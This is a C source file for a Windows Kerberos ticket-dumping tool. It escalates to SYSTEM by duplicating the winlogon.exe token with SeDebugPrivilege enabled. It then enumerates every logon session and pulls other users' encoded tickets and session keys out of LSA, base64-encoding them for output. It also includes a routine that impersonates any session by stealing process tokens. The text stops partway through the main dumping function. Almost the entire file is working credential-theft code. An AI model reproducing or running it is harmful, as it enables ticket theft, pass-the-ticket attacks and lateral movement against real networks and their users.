#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define SECURITY_WIN32

#include <windows.h>
#include <ntsecapi.h>
#include <sddl.h>
#include <stdio.h>
#include <wchar.h>
#include <io.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <tlhelp32.h>

#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "advapi32.lib")

#ifndef KERB_RETRIEVE_TICKET_AS_KERB_CRED
#define KERB_RETRIEVE_TICKET_AS_KERB_CRED 0x8
#endif

#ifndef SE_DEBUG_PRIVILEGE
#define SE_DEBUG_PRIVILEGE 20
#endif


typedef NTSTATUS(NTAPI* PLSA_ENUMERATE_LOGON_SESSIONS)(PULONG, PLUID*);
typedef NTSTATUS(NTAPI* PLSA_GET_LOGON_SESSION_DATA)(PLUID, PSECURITY_LOGON_SESSION_DATA*);
typedef NTSTATUS(NTAPI* PLSA_FREE_RETURN_BUFFER)(PVOID);
typedef NTSTATUS(NTAPI* PLSA_CONNECT_UNTRUSTED)(PHANDLE);
typedef NTSTATUS(NTAPI* PLSA_LOOKUP_AUTHENTICATION_PACKAGE)(HANDLE, PLSA_STRING, PULONG);
typedef NTSTATUS(NTAPI* PLSA_CALL_AUTHENTICATION_PACKAGE)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
typedef NTSTATUS(NTAPI* PLSA_DEREGISTER_LOGON_PROCESS)(HANDLE);


typedef enum _MY_KERB_PROTOCOL_MESSAGE_TYPE {
    MY_KerbDebugRequestMessage = 0,
    MY_KerbQueryTicketCacheMessage,
    MY_KerbChangeMachinePasswordMessage,
    MY_KerbVerifyPacMessage,
    MY_KerbRetrieveTicketMessage,
    MY_KerbUpdateAddressesMessage,
    MY_KerbPurgeTicketCacheMessage,
    MY_KerbChangePasswordMessage,
    MY_KerbRetrieveEncodedTicketMessage,
    MY_KerbDecryptDataMessage,
    MY_KerbAddBindingCacheEntryMessage,
    MY_KerbSetPasswordMessage,
    MY_KerbSetPasswordExMessage,
    MY_KerbVerifyCredentialsMessage,
    MY_KerbQueryTicketCacheExMessage,
    MY_KerbPurgeTicketCacheExMessage,
    MY_KerbRefreshSmartcardCredentialsMessage,
    MY_KerbAddExtraCredentialsMessage,
    MY_KerbQuerySupplementalCredentialsMessage,
    MY_KerbTransferCredentialsMessage,
    MY_KerbQueryTicketCacheEx2Message,
    MY_KerbSubmitTicketMessage,
    MY_KerbAddExtraCredentialsExMessage,
    MY_KerbQueryKdcProxyCacheMessage,
    MY_KerbPurgeKdcProxyCacheMessage,
    MY_KerbQueryTicketCacheEx3Message,
    MY_KerbCleanupMachinePkinitCredsMessage,
    MY_KerbAddBindingCacheEntryExMessage,
    MY_KerbQueryBindingCacheMessage,
    MY_KerbPurgeBindingCacheMessage,
    MY_KerbQueryDomainExtendedPoliciesMessage,
    MY_KerbQueryS4U2ProxyCacheMessage
} MY_KERB_PROTOCOL_MESSAGE_TYPE;


typedef struct _MY_KERB_QUERY_TKT_CACHE_REQUEST {
    MY_KERB_PROTOCOL_MESSAGE_TYPE MessageType;
    LUID LogonId;
} MY_KERB_QUERY_TKT_CACHE_REQUEST;


typedef struct _MY_KERB_QUERY_TKT_CACHE_RESPONSE {
    MY_KERB_PROTOCOL_MESSAGE_TYPE MessageType;
    ULONG CountOfTickets;
} MY_KERB_QUERY_TKT_CACHE_RESPONSE;


typedef struct _MY_KERB_TICKET_CACHE_INFO_EX {
    LSA_UNICODE_STRING ClientName;
    LSA_UNICODE_STRING ClientRealm;
    LSA_UNICODE_STRING ServerName;
    LSA_UNICODE_STRING ServerRealm;
    LARGE_INTEGER StartTime;
    LARGE_INTEGER EndTime;
    LARGE_INTEGER RenewTime;
    LONG EncryptionType;
    ULONG TicketFlags;
} MY_KERB_TICKET_CACHE_INFO_EX;


typedef struct _MY_KERB_CRYPTO_KEY {
    LONG KeyType;
    ULONG Length;
    PUCHAR Value;
} MY_KERB_CRYPTO_KEY;


typedef struct _MY_KERB_EXTERNAL_NAME {
    SHORT NameType;
    USHORT NameCount;
    LSA_UNICODE_STRING Names[1];
} MY_KERB_EXTERNAL_NAME;


typedef struct _MY_KERB_EXTERNAL_TICKET {
    MY_KERB_EXTERNAL_NAME* ServiceName;
    MY_KERB_EXTERNAL_NAME* TargetName;
    MY_KERB_EXTERNAL_NAME* ClientName;
    LSA_UNICODE_STRING DomainName;
    LSA_UNICODE_STRING TargetDomainName;
    LSA_UNICODE_STRING AltTargetDomainName;
    MY_KERB_CRYPTO_KEY SessionKey;
    ULONG TicketFlags;
    ULONG Flags;
    LARGE_INTEGER KeyExpirationTime;
    LARGE_INTEGER StartTime;
    LARGE_INTEGER EndTime;
    LARGE_INTEGER RenewUntil;
    LARGE_INTEGER TimeSkew;
    LONG EncodedTicketSize;
    PUCHAR EncodedTicket;
} MY_KERB_EXTERNAL_TICKET;


typedef struct _MY_KERB_RETRIEVE_TKT_RESPONSE {
    MY_KERB_EXTERNAL_TICKET Ticket;
} MY_KERB_RETRIEVE_TKT_RESPONSE;


typedef struct _MY_SECURITY_HANDLE {
    PVOID LowPart;
    PVOID HighPart;
} MY_SECURITY_HANDLE;


typedef struct _MY_KERB_RETRIEVE_TKT_REQUEST {
    MY_KERB_PROTOCOL_MESSAGE_TYPE MessageType;
    LUID LogonId;
    LSA_UNICODE_STRING TargetName;
    ULONG TicketFlags;
    ULONG CacheOptions;
    LONG EncryptionType;
    MY_SECURITY_HANDLE CredentialsHandle;
} MY_KERB_RETRIEVE_TKT_REQUEST;


typedef struct {
    ULONG logonId;
    wchar_t userName[256];
    wchar_t domain[256];
    wchar_t serviceName[512];
} TGT_INFO;

#define MAX_TGTS 100
TGT_INFO g_tgtList[MAX_TGTS];
ULONG g_tgtCount = 0;

static const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


void PrintDebug(const char* m) {
    printf("[*] %s\n", m);
}


void PrintSuccess(const char* m) {
    printf("[+] %s\n", m);
}


void PrintError(const char* m) {
    printf("[-] %s\n", m);
}


void PrintSeparator(const char* title) {
    printf("\n================================================================================\n");
    if (title) printf("  %s\n================================================================================\n", title);
}


const wchar_t* GetLogonTypeString(ULONG t) {
    switch (t) {
    case 2: return L"Interactive";
    case 3: return L"Network";
    case 4: return L"Batch";
    case 5: return L"Service";
    case 7: return L"Unlock";
    case 8: return L"NetworkCleartext";
    case 9: return L"NewCredentials";
    case 10: return L"RemoteInteractive";
    case 11: return L"CachedInteractive";
    default: return L"Unknown";
    }
}


const char* GetEncryptionTypeName(LONG e) {
    switch (e) {
    case 1: return "des_cbc_crc";
    case 3: return "des_cbc_md5";
    case 17: return "aes128_cts_hmac_sha1";
    case 18: return "aes256_cts_hmac_sha1";
    case 23: return "rc4_hmac";
    case 24: return "rc4_hmac_exp";
    default: return "unknown";
    }
}


char* Base64Encode(const unsigned char* data, size_t input_length) {
    size_t output_length = 4 * ((input_length + 2) / 3);
    char* encoded_data = (char*)malloc(output_length + 1);
    if (encoded_data == NULL) return NULL;

    size_t i, j;
    for (i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = base64_chars[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = base64_chars[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = base64_chars[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = base64_chars[(triple >> 0 * 6) & 0x3F];
    }

    for (i = 0; i < (3 - input_length % 3) % 3; i++)
        encoded_data[output_length - 1 - i] = '=';

    encoded_data[output_length] = '\0';
    return encoded_data;
}


void PrintBase64(const char* base64_string) {
    if (!base64_string || strlen(base64_string) == 0) {
        printf("      (empty)\n");
        return;
    }
    printf("      %s\n", base64_string);
}


wchar_t* UnicodeStringToWString(LSA_UNICODE_STRING* ustr, wchar_t* buffer, size_t bufferSize) {
    if (ustr && ustr->Buffer && ustr->Length > 0) {
        size_t len = ustr->Length / sizeof(WCHAR);
        if (len >= bufferSize) len = bufferSize - 1;
        wcsncpy(buffer, ustr->Buffer, len);
        buffer[len] = L'\0';
        return buffer;
    }
    buffer[0] = L'\0';
    return buffer;
}


void AddTGTToList(ULONG logonId, const wchar_t* userName, const wchar_t* domain, const wchar_t* serviceName) {
    if (g_tgtCount >= MAX_TGTS) return;

    for (ULONG i = 0; i < g_tgtCount; i++) {
        if (g_tgtList[i].logonId == logonId &&
            wcscmp(g_tgtList[i].serviceName, serviceName) == 0) {
            return;
        }
    }

    g_tgtList[g_tgtCount].logonId = logonId;

    if (userName && wcslen(userName) > 0) {
        wcsncpy(g_tgtList[g_tgtCount].userName, userName, 255);
        g_tgtList[g_tgtCount].userName[255] = L'\0';
    }
    else {
        wcscpy(g_tgtList[g_tgtCount].userName, L"(unknown)");
    }

    if (domain && wcslen(domain) > 0) {
        wcsncpy(g_tgtList[g_tgtCount].domain, domain, 255);
        g_tgtList[g_tgtCount].domain[255] = L'\0';
    }
    else {
        wcscpy(g_tgtList[g_tgtCount].domain, L"(unknown)");
    }

    if (serviceName && wcslen(serviceName) > 0) {
        wcsncpy(g_tgtList[g_tgtCount].serviceName, serviceName, 511);
        g_tgtList[g_tgtCount].serviceName[511] = L'\0';
    }
    else {
        wcscpy(g_tgtList[g_tgtCount].serviceName, L"(unknown)");
    }

    g_tgtCount++;
}


void PrintCurrentLogonId() {
    HANDLE t;
    TOKEN_STATISTICS s;
    DWORD l;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t) &&
        GetTokenInformation(t, TokenStatistics, &s, sizeof(s), &l)) {
        printf("Current LogonId is 0:0x%x\n", s.AuthenticationId.LowPart);
        CloseHandle(t);
    }
}


void PrintFileTime(const LARGE_INTEGER* ft) {
    FILETIME fileTime;
    SYSTEMTIME systemTime, localTime;

    fileTime.dwLowDateTime = ft->LowPart;
    fileTime.dwHighDateTime = ft->HighPart;

    if (ft->QuadPart == 0) {
        printf("01/01/1601 01:00:00");
        return;
    }

    if (FileTimeToSystemTime(&fileTime, &systemTime)) {
        SystemTimeToTzSpecificLocalTime(NULL, &systemTime, &localTime);
        printf("%02d/%02d/%04d %02d:%02d:%02d",
            localTime.wDay, localTime.wMonth, localTime.wYear,
            localTime.wHour, localTime.wMinute, localTime.wSecond);
    }
    else {
        printf("01/01/1601 01:00:00");
    }
}


void PrintTicketFlags(ULONG flags) {
    BOOL first = TRUE;
    if (flags & 0x40000000) { printf("name_canonicalize"); first = FALSE; }
    if (flags & 0x00100000) { if (!first) printf(", "); printf("ok_as_delegate"); first = FALSE; }
    if (flags & 0x00400000) { if (!first) printf(", "); printf("pre_authent"); first = FALSE; }
    if (flags & 0x00040000) { if (!first) printf(", "); printf("initial"); first = FALSE; }
    if (flags & 0x00800000) { if (!first) printf(", "); printf("renewable"); first = FALSE; }
    if (flags & 0x08000000) { if (!first) printf(", "); printf("forwarded"); first = FALSE; }
    if (flags & 0x80000000) { if (!first) printf(", "); printf("forwardable"); }
}


BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}


BOOL IsHighIntegrity() {
    BOOL isMember = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID adminGroup;

    if (!AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        return FALSE;
    }

    CheckTokenMembership(NULL, adminGroup, &isMember);
    FreeSid(adminGroup);

    return isMember == TRUE;
}


BOOL IsSystem() {
    BOOL isSystem = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID systemSid;

    if (!AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID,
        0, 0, 0, 0, 0, 0, 0, &systemSid)) {
        return FALSE;
    }

    CheckTokenMembership(NULL, systemSid, &isSystem);
    FreeSid(systemSid);

    return isSystem == TRUE;
}


DWORD GetProcessIdOfName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_wcsicmp(pe.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe.th32ProcessID;
        }
    } while (Process32NextW(hSnapshot, &pe));

    CloseHandle(hSnapshot);
    return 0;
}


BOOL GetSystem() {
    if (!IsHighIntegrity()) {
        return FALSE;
    }

    if (!EnableDebugPrivilege()) {
        return FALSE;
    }

    DWORD winlogonPid = GetProcessIdOfName(L"winlogon.exe");
    if (winlogonPid == 0) {
        return FALSE;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
    if (!hProcess) {
        return FALSE;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hDupToken;
    if (!DuplicateToken(hToken, SecurityImpersonation, &hDupToken)) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!ImpersonateLoggedOnUser(hDupToken)) {
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    CloseHandle(hToken);
    CloseHandle(hDupToken);
    CloseHandle(hProcess);

    return IsSystem();
}


HANDLE GetLsaHandle(BOOL elevateToSystem) {
    HANDLE lsaHandle = NULL;
    HMODULE hSecur32 = LoadLibraryA("secur32.dll");

    if (!hSecur32) {
        return NULL;
    }

    PLSA_CONNECT_UNTRUSTED pLsaConnectUntrusted =
        (PLSA_CONNECT_UNTRUSTED)GetProcAddress(hSecur32, "LsaConnectUntrusted");

    if (!pLsaConnectUntrusted) {
        FreeLibrary(hSecur32);
        return NULL;
    }

    if (IsHighIntegrity() && elevateToSystem && !IsSystem()) {
        if (!GetSystem()) {
            FreeLibrary(hSecur32);
            return NULL;
        }

        pLsaConnectUntrusted(&lsaHandle);
        RevertToSelf();
    }
    else {
        pLsaConnectUntrusted(&lsaHandle);
    }

    FreeLibrary(hSecur32);
    return lsaHandle;
}


BOOL RequestServiceTicket(HANDLE lsaHandle, ULONG authPack, LUID userLogonID,
    const wchar_t* targetName, ULONG ticketFlags,
    unsigned char** ticketBytes, ULONG* ticketSize,
    unsigned char** sessionKeyBytes, ULONG* sessionKeySize,
    LONG* keyType) {

    HMODULE hSecur32 = LoadLibraryA("secur32.dll");
    if (!hSecur32) {
        return FALSE;
    }

    PLSA_CALL_AUTHENTICATION_PACKAGE pLsaCallAuthenticationPackage =
        (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(hSecur32, "LsaCallAuthenticationPackage");
    PLSA_FREE_RETURN_BUFFER pLsaFreeReturnBuffer =
        (PLSA_FREE_RETURN_BUFFER)GetProcAddress(hSecur32, "LsaFreeReturnBuffer");

    if (!pLsaCallAuthenticationPackage || !pLsaFreeReturnBuffer) {
        FreeLibrary(hSecur32);
        return FALSE;
    }

    size_t targetNameLen = wcslen(targetName);
    LSA_UNICODE_STRING tName;
    tName.Length = (USHORT)(targetNameLen * sizeof(WCHAR));
    tName.MaximumLength = tName.Length + sizeof(WCHAR);
    tName.Buffer = (PWSTR)targetName;

    size_t structSize = sizeof(MY_KERB_RETRIEVE_TKT_REQUEST);
    size_t totalSize = structSize + tName.MaximumLength;

    PVOID unmanagedAddr = LocalAlloc(LPTR, totalSize);
    if (!unmanagedAddr) {
        FreeLibrary(hSecur32);
        return FALSE;
    }

    MY_KERB_RETRIEVE_TKT_REQUEST* pRequest = (MY_KERB_RETRIEVE_TKT_REQUEST*)unmanagedAddr;
    pRequest->MessageType = MY_KerbRetrieveEncodedTicketMessage;
    pRequest->LogonId = userLogonID;
    pRequest->TargetName = tName;
    pRequest->TicketFlags = ticketFlags;
    pRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    pRequest->EncryptionType = 0;
    pRequest->CredentialsHandle.LowPart = NULL;
    pRequest->CredentialsHandle.HighPart = NULL;

    PVOID newTargetNameBuffPtr = (PVOID)((BYTE*)unmanagedAddr + structSize);
    memcpy(newTargetNameBuffPtr, tName.Buffer, tName.MaximumLength);
    pRequest->TargetName.Buffer = (PWSTR)newTargetNameBuffPtr;

    PVOID responsePtr = NULL;
    ULONG responseSize = 0;
    NTSTATUS protocolStatus = 0;

    NTSTATUS status = pLsaCallAuthenticationPackage(
        lsaHandle,
        authPack,
        unmanagedAddr,
        (ULONG)totalSize,
        &responsePtr,
        &responseSize,
        &protocolStatus
    );

    BOOL success = FALSE;

    if (status == 0 && protocolStatus == 0 && responseSize != 0) {
        MY_KERB_RETRIEVE_TKT_RESPONSE* pResponse = (MY_KERB_RETRIEVE_TKT_RESPONSE*)responsePtr;

        if (pResponse->Ticket.EncodedTicketSize > 0 && pResponse->Ticket.EncodedTicket != NULL) {
            *ticketSize = pResponse->Ticket.EncodedTicketSize;
            *ticketBytes = (unsigned char*)malloc(*ticketSize);
            if (*ticketBytes) {
                memcpy(*ticketBytes, pResponse->Ticket.EncodedTicket, *ticketSize);
            }

            if (pResponse->Ticket.SessionKey.Length > 0 && pResponse->Ticket.SessionKey.Value != NULL) {
                *sessionKeySize = pResponse->Ticket.SessionKey.Length;
                *sessionKeyBytes = (unsigned char*)malloc(*sessionKeySize);
                if (*sessionKeyBytes) {
                    memcpy(*sessionKeyBytes, pResponse->Ticket.SessionKey.Value, *sessionKeySize);
                    *keyType = pResponse->Ticket.SessionKey.KeyType;
                }
            }

            success = TRUE;
        }
    }

    if (responsePtr) {
        pLsaFreeReturnBuffer(responsePtr);
    }

    LocalFree(unmanagedAddr);
    FreeLibrary(hSecur32);

    return success;
}


BOOL ImpersonateSession(ULONG targetLogonId, HANDLE* hImpToken) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
        if (!hProcess) continue;

        HANDLE hToken;
        if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
            TOKEN_STATISTICS stats;
            DWORD len;
            if (GetTokenInformation(hToken, TokenStatistics, &stats, sizeof(stats), &len)) {
                if (stats.AuthenticationId.LowPart == targetLogonId) {
                    if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                        SecurityImpersonation, TokenImpersonation, hImpToken)) {
                        CloseHandle(hToken);
                        CloseHandle(hProcess);
                        CloseHandle(hSnapshot);
                        return TRUE;
                    }
                }
            }
            CloseHandle(hToken);
        }
        CloseHandle(hProcess);
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return FALSE;
}


void EnumerateLogonSessions() {
    HMODULE h = LoadLibraryA("secur32.dll");
    PLSA_ENUMERATE_LOGON_SESSIONS enum_fn = (PLSA_ENUMERATE_LOGON_SESSIONS)GetProcAddress(h, "LsaEnumerateLogonSessions");
    PLSA_GET_LOGON_SESSION_DATA get_fn = (PLSA_GET_LOGON_SESSION_DATA)GetProcAddress(h, "LsaGetLogonSessionData");
    PLSA_FREE_RETURN_BUFFER free_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");

    ULONG cnt = 0;
    PLUID lst = NULL;
    if (enum_fn(&cnt, &lst) == 0) {
        printf("\n");
        for (ULONG i = 0; i < cnt; i++) {
            PSECURITY_LOGON_SESSION_DATA d = NULL;
            if (get_fn(&lst[i], &d) == 0 && d) {
                wchar_t dom[256] = { 0 }, usr[256] = { 0 }, auth[256] = { 0 };

                if (d->LogonDomain.Buffer && d->LogonDomain.Length > 0) {
                    size_t len = d->LogonDomain.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(dom, d->LogonDomain.Buffer, len);
                    dom[len] = L'\0';
                }

                if (d->UserName.Buffer && d->UserName.Length > 0) {
                    size_t len = d->UserName.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(usr, d->UserName.Buffer, len);
                    usr[len] = L'\0';
                }

                if (d->AuthenticationPackage.Buffer && d->AuthenticationPackage.Length > 0) {
                    size_t len = d->AuthenticationPackage.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(auth, d->AuthenticationPackage.Buffer, len);
                    auth[len] = L'\0';
                }

                printf("[%lu] Session %lu 0:0x%lx ", (unsigned long)i, (unsigned long)d->Session, (unsigned long)lst[i].LowPart);

                if (wcslen(dom) && wcslen(usr)) wprintf(L"%ls\\%ls ", dom, usr);
                else if (wcslen(usr)) wprintf(L"%ls ", usr);
                else printf("\\ ");

                if (wcslen(auth)) wprintf(L"%ls:%ls\n", auth, GetLogonTypeString(d->LogonType));
                else wprintf(L"Unknown:%ls\n", GetLogonTypeString(d->LogonType));

                free_fn(d);
            }
        }
        free_fn(lst);
    }
    FreeLibrary(h);
}


void EnumerateMyTickets() {
    HMODULE h = LoadLibraryA("secur32.dll");
    PLSA_CONNECT_UNTRUSTED con_fn = (PLSA_CONNECT_UNTRUSTED)GetProcAddress(h, "LsaConnectUntrusted");
    PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
    PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
    PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");

    HANDLE lsa = NULL;
    char krb[] = "Kerberos";
    LSA_STRING pkg;
    pkg.Buffer = krb;
    pkg.Length = 8;
    pkg.MaximumLength = 9;

    ULONG auth = 0;
    PKERB_QUERY_TKT_CACHE_RESPONSE rsp = NULL;
    ULONG sz = 0;
    NTSTATUS sub = 0;

    if (con_fn(&lsa) == 0 && lkp_fn(lsa, &pkg, &auth) == 0) {
        KERB_QUERY_TKT_CACHE_REQUEST req;
        req.MessageType = KerbQueryTicketCacheMessage;
        req.LogonId.LowPart = 0;
        req.LogonId.HighPart = 0;

        if (cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub) == 0 && sub == 0) {
            printf("Cached Tickets: (%lu)\n\n", (unsigned long)rsp->CountOfTickets);

            for (ULONG i = 0; i < rsp->CountOfTickets; i++) {
                KERB_TICKET_CACHE_INFO* t = &rsp->Tickets[i];
                wchar_t srv[512] = { 0 }, rlm[256] = { 0 };

                if (t->ServerName.Buffer && t->ServerName.Length > 0) {
                    size_t len = t->ServerName.Length / sizeof(WCHAR);
                    if (len > 511) len = 511;
                    wcsncpy(srv, t->ServerName.Buffer, len);
                    srv[len] = L'\0';
                }

                if (t->RealmName.Buffer && t->RealmName.Length > 0) {
                    size_t len = t->RealmName.Length / sizeof(WCHAR);
                    if (len > 255) len = 255;
                    wcsncpy(rlm, t->RealmName.Buffer, len);
                    rlm[len] = L'\0';
                }

                printf("#%lu>\tClient: %ls @ %ls\n", (unsigned long)i, srv, rlm);
                printf("\tServer: %ls @ %ls\n", srv, rlm);
                printf("\tKerbTicket Encryption Type: %s\n", GetEncryptionTypeName(t->EncryptionType));

                SYSTEMTIME stm;
                FILETIME ft;
                ft.dwLowDateTime = t->StartTime.LowPart;
                ft.dwHighDateTime = t->StartTime.HighPart;
                FileTimeToSystemTime(&ft, &stm);
                printf("\tStart Time: %02d/%02d/%04d %02d:%02d:%02d\n",
                    stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);

                ft.dwLowDateTime = t->EndTime.LowPart;
                ft.dwHighDateTime = t->EndTime.HighPart;
                FileTimeToSystemTime(&ft, &stm);
                printf("\tEnd Time: %02d/%02d/%04d %02d:%02d:%02d\n",
                    stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);

                printf("\tTicket Flags: 0x%lx", (unsigned long)t->TicketFlags);
                if (t->TicketFlags & 0x40000000) printf(" -> forwardable");
                if (t->TicketFlags & 0x00800000) printf(" -> renewable");
                if (t->TicketFlags & 0x00400000) printf(" -> initial");
                printf("\n\n");
            }

            fre_fn(rsp);
        }
        else {
            printf("Cached Tickets: (0)\n");
        }
        LsaDeregisterLogonProcess(lsa);
    }
    FreeLibrary(h);
}


void EnumerateAllTickets() {
    wprintf(L"[*] Action: Dump Kerberos Ticket Data ");

    if (IsHighIntegrity()) {
        wprintf(L"(All Users)\n\n");
    }
    else {
        wprintf(L"(Current User)\n\n");
    }

    HANDLE hToken;
    LUID currentLuid = { 0 };
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD returnLength;
        TOKEN_STATISTICS stats;
        if (GetTokenInformation(hToken, TokenStatistics, &stats, sizeof(stats), &returnLength)) {
            currentLuid = stats.AuthenticationId;
            wprintf(L"[*] Current LUID    : 0x%llx\n\n",
                ((UINT64)currentLuid.HighPart << 32) | currentLuid.LowPart);
        }
        CloseHandle(hToken);
    }

    if (IsHighIntegrity() && EnableDebugPrivilege()) {
        PrintSuccess("SeDebugPrivilege enabled successfully");
    }

    HANDLE lsaHandle = GetLsaHandle(TRUE);
    if (!lsaHandle) {
        PrintError("Failed to get LSA handle");
        return;
    }

    HMODULE hSecur32 = LoadLibraryA("secur32.dll");
    if (!hSecur32) {
        PrintError("Failed to load secur32.dll");
        return;
    }

    PLSA_LOOKUP_AUTHENTICATION_PACKAGE pLsaLookupAuthenticationPackage =
        (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(hSecur32, "LsaLookupAuthenticationPackage");
    PLSA_CALL_AUTHENTICATION_PACKAGE pLsaCallAuthenticationPackage =
        (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(hSecur32, "LsaCallAuthenticationPackage");
    PLSA_FREE_RETURN_BUFFER pLsaFreeReturnBuffer =
        (PLSA_FREE_RETURN_BUFFER)GetProcAddress(hSecur32, "LsaFreeReturnBuffer");
    PLSA_DEREGISTER_LOGON_PROCESS pLsaDeregisterLogonProcess =
        (PLSA_DEREGISTER_LOGON_PROCESS)GetProcAddress(hSecur32, "LsaDeregisterLogonProcess");
    PLSA_ENUMERATE_LOGON_SESSIONS pLsaEnumerateLogonSessions =
        (PLSA_ENUMERATE_LOGON_SESSIONS)GetProcAddress(hSecur32, "LsaEnumerateLogonSessions");
    PLSA_GET_LOGON_SESSION_DATA pLsaGetLogonSessionData =
        (PLSA_GET_LOGON_SESSION_DATA)GetProcAddress(hSecur32, "LsaGetLogonSessionData");

    if (!pLsaLookupAuthenticationPackage || !pLsaCallAuthenticationPackage ||
        !pLsaFreeReturnBuffer || !pLsaDeregisterLogonProcess ||
        !pLsaEnumerateLogonSessions || !pLsaGetLogonSessionData) {
        PrintError("Failed to get LSA function addresses");
        FreeLibrary(hSecur32);
        return;
    }

    LSA_STRING packageName;
    char kerberos[] = "kerberos";
    packageName.Buffer = kerberos;
    packageName.Length = (USHORT)strlen(packageName.Buffer);
    packageName.MaximumLength = packageName.Length + 1;

    ULONG authPack = 0;
    NTSTATUS status = pLsaLookupAuthenticationPackage(lsaHandle, &packageName, &authPack);
    if (status != 0) {
        PrintError("LsaLookupAuthenticationPackage failed");
        FreeLibrary(hSecur32);
        return;
    }

    ULONG sessionCount = 0;
    PLUID sessionList = NULL;

    if (IsHighIntegrity()) {
        status = pLsaEnumerateLogonSessions(&sessionCount, &sessionList);
        if (status != 0) {
            PrintError("LsaEnumerateLogonSessions failed");
            FreeLibrary(hSecur32);
            return;
        }
    }
    else {
        sessionCount = 1;
        sessionList = (PLUID)malloc(sizeof(LUID));
        if (sessionList) {
            sessionList[0] = currentLuid;
        }
    }

    // Reset TGT list
    g_tgtCount = 0;

    ULONG total_sessions_with_tickets = 0;
    ULONG total_tickets = 0;
    ULONG total_tgts = 0;

    for (ULONG i = 0; i < sessionCount; i++) {
        PSECURITY_LOGON_SESSION_DATA pSessionData = NULL;
